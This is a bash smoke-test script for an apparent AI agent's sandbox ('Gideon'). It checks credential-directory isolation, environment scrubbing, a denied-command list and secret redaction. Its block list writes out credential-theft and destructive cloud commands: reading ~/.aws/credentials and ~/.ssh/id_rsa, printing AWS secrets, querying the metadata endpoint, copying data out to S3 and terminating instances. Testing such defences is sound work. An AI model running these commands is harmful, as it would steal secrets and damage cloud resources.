#!/usr/bin/env bash
                                                                      
                                                                          
                                   
#
        
                                        
#
                
                                                                             

set -uo pipefail

export PYTHONPATH="${PYTHONPATH:-runtime}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
PASS=0; FAIL=0; SKIP=0

pass() { echo -e "  ${GREEN}✓ PASS${NC}: $1"; ((PASS++)); }
fail() { echo -e "  ${RED}✗ FAIL${NC}: $1"; ((FAIL++)); }
skip() { echo -e "  ${YELLOW}⊘ SKIP${NC}: $1"; ((SKIP++)); }

                                       
sandbox_run() {
    local sandbox_mode="${GIDEON_SANDBOX_MODE:-auto}"
    python3 -c "
from gideon.sandbox import wrap_argv
import subprocess, sys
argv, cleanup = wrap_argv(sys.argv[1:], '$sandbox_mode')
try:
    r = subprocess.run(argv, capture_output=True, timeout=30, text=True)
    sys.stdout.write(r.stdout)
    sys.stderr.write(r.stderr)
    sys.exit(r.returncode)
finally:
    if cleanup:
        import os; os.unlink(cleanup)
" "$@"
}

                             
is_denied() {
    python3 -c "
import json, re, sys
with open('runtime/gideon/config/defaults.json') as f:
    cmds = json.load(f)['toolsSettings']['execute_bash']['deniedCommands']
cmd = ' '.join(sys.argv[1:])
for p in cmds:
    if re.search(p, cmd):
        print(f'DENIED by: {p}')
        sys.exit(0)
print('ALLOWED')
sys.exit(1)
" "$@"
}

                              
check_redaction() {
    python3 -c "
from gideon.security import redact_credentials
import sys
text = sys.argv[1]
result, warnings = redact_credentials(text)
if warnings:
    print(f'REDACTED ({len(warnings)} patterns)')
    sys.exit(0)
else:
    print('NOT REDACTED')
    sys.exit(1)
" "$1"
}

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          Gideon Sandbox Security Smoke Test               ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Sandbox: ${GIDEON_SANDBOX_MODE:-auto} (standard)"
echo ""

                                                 
echo "━━━ 1. Sandbox Filesystem Isolation ━━━"

                                                  
if sandbox_run ls ~/.aws/ >/dev/null 2>&1; then
    pass "~/.aws is accessible (standard mode)"
else
    skip "~/.aws does not exist on this host"
fi

if sandbox_run ls ~/.ssh/ >/dev/null 2>&1; then
    pass "~/.ssh is accessible (standard mode)"
else
    skip "~/.ssh does not exist on this host"
fi

if sandbox_run ls ~/.kube/ 2>/dev/null | head -1 >/dev/null 2>&1; then
    pass "~/.kube is accessible (standard mode)"
else
    if [ -d ~/.kube ]; then
        fail "~/.kube exists but NOT accessible in sandbox"
    else
        skip "~/.kube does not exist on this host"
    fi
fi

                                                       
for dir in .gnupg .config/gcloud .azure .docker; do
    real_path="$HOME/$dir"
    if [ -d "$real_path" ]; then
        if sandbox_run ls "$real_path" 2>/dev/null | grep -q .; then
            fail "~/$dir is visible in sandbox (should be hidden)"
        else
            pass "~/$dir is hidden in sandbox"
        fi
    else
        skip "~/$dir does not exist on this host"
    fi
done

                                      
echo ""
echo "━━━ 2. Environment Variable Scrubbing ━━━"

                                                           
export AWS_SECRET_ACCESS_KEY="test_secret_key_12345"
export AWS_SESSION_TOKEN="test_session_token_12345"

secret_in_sandbox=$(sandbox_run env 2>/dev/null | grep -c "AWS_SECRET\|AWS_SESSION" || true)
if [ "$secret_in_sandbox" -eq 0 ]; then
    pass "AWS_SECRET*/AWS_SESSION* scrubbed from sandbox env"
else
    fail "AWS_SECRET*/AWS_SESSION* leaked into sandbox ($secret_in_sandbox vars found)"
fi

unset AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

ssh_sock_in_sandbox=$(sandbox_run env 2>/dev/null | grep -c "SSH_AUTH_SOCK" || true)
if [ "$ssh_sock_in_sandbox" -eq 0 ]; then
    pass "SSH_AUTH_SOCK scrubbed from sandbox env"
else
    fail "SSH_AUTH_SOCK leaked into sandbox"
fi

                                    
echo ""
echo "━━━ 3. Denied Commands (should BLOCK) ━━━"

blocked_cmds=(
    "aws s3 cp ./file s3://bucket/exfil"
    "aws s3 sync ./dir s3://bucket/"
    "aws ec2 terminate-instances --instance-ids i-1234"
    "aws logs delete-log-group --log-group-name test"
    "echo \$AWS_SECRET_ACCESS_KEY"
    "printenv AWS_SECRET_ACCESS_KEY"
    "env | grep AWS_SECRET"
    "cat ~/.aws/credentials"
    "cat ~/.ssh/id_rsa"
    "python3 -c 'import boto3; print(boto3.Session().get_credentials())'"
    "curl http://169.254.169.254/latest/meta-data/"
)

for cmd in "${blocked_cmds[@]}"; do
    if is_denied $cmd >/dev/null 2>&1; then
        pass "BLOCKED: $cmd"
    else
        fail "NOT BLOCKED: $cmd"
    fi
done

                                                   
echo ""
echo "━━━ 4. Denied Commands (should ALLOW) ━━━"
echo "  Note: sensitive commands are blocked by the sandbox at runtime"

allowed_cmds=(
    "aws sts get-caller-identity"
    "aws ec2 describe-instances"
    "aws logs filter-log-events --log-group-name /aws/lambda/test"
    "aws s3 ls s3://my-bucket"
    "aws s3 cp s3://bucket/file ./local"
    "kubectl get pods"
    "git clone https://github.com/gideon/gideon"
)

for cmd in "${allowed_cmds[@]}"; do
    if is_denied $cmd >/dev/null 2>&1; then
        fail "BLOCKED (should be allowed): $cmd"
    else
        pass "ALLOWED: $cmd"
    fi
done

                                                
echo ""
echo "━━━ 5. Credential Output Redaction ━━━"

                    
redact_cases=(
    "AKIAIOSFODNN7EXAMPLE"
    "SecretAccessKey=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG"
    "SessionToken=FwoGZXIvYXdzEBYaDHlongtoken1234567890abc"
    "-----BEGIN RSA PRIVATE KEY-----"
    "xoxb-1234567890-abcdefghijklmnop"
)

for text in "${redact_cases[@]}"; do
    if check_redaction "$text" >/dev/null 2>&1; then
        pass "REDACTED: ${text:0:40}..."
    else
        fail "NOT REDACTED: ${text:0:40}..."
    fi
done

                                        
safe_cases=(
    "Successfully refreshed aws credentials for default"
    '{"Account": "123456789012", "Arn": "arn:aws:iam::123:user/dev"}'
    "Cloning into Gideon... remote: Enumerating objects: 1234"
    "NAME       READY   STATUS    RESTARTS   AGE"
)

for text in "${safe_cases[@]}"; do
    if check_redaction "$text" >/dev/null 2>&1; then
        fail "FALSE POSITIVE: ${text:0:50}..."
    else
        pass "NOT REDACTED (correct): ${text:0:50}..."
    fi
done

                                                        
echo ""
echo "━━━ 6. Base64 Encoded Credential Detection ━━━"

b64_secret=$(echo -n "AccessKeyId=AKIAIOSFODNN7EXAMPLE SecretAccessKey=wJalrXUtnFEMI" | base64)
if check_redaction "$b64_secret" >/dev/null 2>&1; then
    pass "Base64-encoded credentials detected and redacted"
else
    fail "Base64-encoded credentials NOT detected"
fi

b64_privkey=$(echo -n "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA" | base64)
if check_redaction "$b64_privkey" >/dev/null 2>&1; then
    pass "Base64-encoded private key detected and redacted"
else
    fail "Base64-encoded private key NOT detected"
fi

b64_benign=$(echo -n "Hello world, this is a normal message" | base64)
if check_redaction "$b64_benign" >/dev/null 2>&1; then
    fail "False positive on benign base64"
else
    pass "Benign base64 NOT redacted (correct)"
fi

                 
echo ""
echo "══════════════════════════════════════════════════════════════"
echo -e "  ${GREEN}PASS: $PASS${NC}  ${RED}FAIL: $FAIL${NC}  ${YELLOW}SKIP: $SKIP${NC}"
echo "══════════════════════════════════════════════════════════════"

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
